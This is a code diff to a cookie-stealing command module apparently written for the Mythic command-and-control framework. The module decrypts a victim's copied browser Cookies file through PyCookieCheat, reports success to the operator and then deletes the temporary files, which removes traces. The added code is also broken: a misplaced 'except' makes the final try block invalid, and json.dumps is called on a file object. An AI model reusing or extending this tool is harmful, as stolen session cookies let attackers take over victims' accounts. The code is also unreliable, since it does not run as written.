@@ -151,22 +151,38 @@ class CookieThiefCommand(CommandBase):
         ## Decrypt Cookies file
         try:
             crisp(cookie_args)
-            await MythicRPC().execute("create_output",task_id=task.id,output="Cookies decrypted")
+            if os.path.isfile("cookies.json"):
+                if os.path.getsize("cookies.json") != 0:
+                    await MythicRPC().execute("create_output",task_id=task.id,output="Cookies decrypted")
+                    json_file = open("cookies.json", "r")
+                    print(json.dumps(json_file, indent=4))
+                    json_file.close()
+                    await MythicRPC().execute("create_output",task_id=task.id,output="Cookies decrypted")
+                else:
+                    await MythicRPC().execute("create_output",task_id=task.id,output="No cookies found in Cookies file")
+            else:
+                await MythicRPC().execute("create_output",task_id=task.id,output="cookie.json file failed on creation")
         except Exception as e:
             print("PyCookieCheat script failed with error: " + str(e))
             sys.stdout.flush()
 
 
         # Remove the Cookies file from disk
-        # try:
-        #     if os.path.isfile('/Mythic/mythic/tmp_Cookies'):
-        #         os.remove('/Mythic/mythic/tmp_Cookies')
-        #     else:
-        #         print("Temp Cookies file does not exist.")
-        #         sys.stdout.flush()
-        # except Exception as e:
-        #     print("Encountered an error attempting to remove the temporary Cookies file: " + str(e))
-        #     sys.stdout.flush()
+        try:
+            if os.path.isfile('/Mythic/mythic/tmp_Cookies'):
+                os.remove('/Mythic/mythic/tmp_Cookies')
+            else:
+                print("Temp Cookies file does not exist.")
+                sys.stdout.flush()
+        except Exception as e:
+            print("Encountered an error attempting to remove the temporary Cookies file: " + str(e))
+            sys.stdout.flush()
 
+        try:
+            if os.path.isfile("cookies.json"):
+                os.remove("cookies.json")
+            except Exception as e:
+                print("Encountered an error attempting to remove the cookies.json file: " + str(e))
+                sys.stdout.flush()
 
         return task
